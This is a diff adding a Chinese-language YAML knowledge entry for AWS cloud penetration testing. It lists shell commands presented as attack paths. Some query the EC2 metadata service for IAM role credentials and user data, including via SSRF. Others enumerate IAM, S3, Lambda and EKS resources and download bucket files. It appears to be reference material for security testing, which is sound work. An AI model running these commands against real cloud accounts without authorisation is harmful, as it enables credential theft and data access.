@@ -1,0 +1,77 @@
+name: AWS云环境渗透
+description: AWS云环境信息收集和利用技术
+domain: cloud
+version: '1.0'
+tags:
+- cloud
+- aws
+- privilege-escalation
+knowledge: |
+  # AWS云环境渗透
+
+  ## 信息收集
+
+  ### 元数据服务
+  ```bash
+  # 获取实例元数据
+  curl http://169.254.169.254/latest/meta-data/
+
+  # 获取IAM角色凭据
+  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+  # 获取用户数据（可能包含敏感信息）
+  curl http://169.254.169.254/latest/user-data/
+
+  # 获取实例身份文档
+  curl http://169.254.169.254/latest/dynamic/instance-identity/document
+  ```
+
+  ### IAM 枚举
+  ```bash
+  # 列出当前用户信息
+  aws sts get-caller-identity
+
+  # 列出角色
+  aws iam list-roles
+
+  # 列出策略
+  aws iam list-policies --scope Local
+
+  # 列出用户
+  aws iam list-users
+  ```
+
+  ## 常见攻击路径
+
+  ### 1. S3 桶公开访问
+  ```bash
+  # 列出桶
+  aws s3 ls
+
+  # 列出桶内容
+  aws s3 ls s3://bucket-name/
+
+  # 下载文件
+  aws s3 cp s3://bucket-name/file.txt ./
+  ```
+
+  ### 2. EC2 实例元数据泄露
+  ```bash
+  # SSRF 获取元数据
+  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+  ```
+
+  ### 3. Lambda 函数权限滥用
+  ```bash
+  # 列出函数
+  aws lambda list-functions
+
+  # 获取函数详情
+  aws lambda get-function --function-name function-name
+  ```
+
+  ### 4. EKS 容器逃逸
+  ```bash
+  # 获取集群信息
+  aws eks describe-cluster --name cluster-name
+  ```
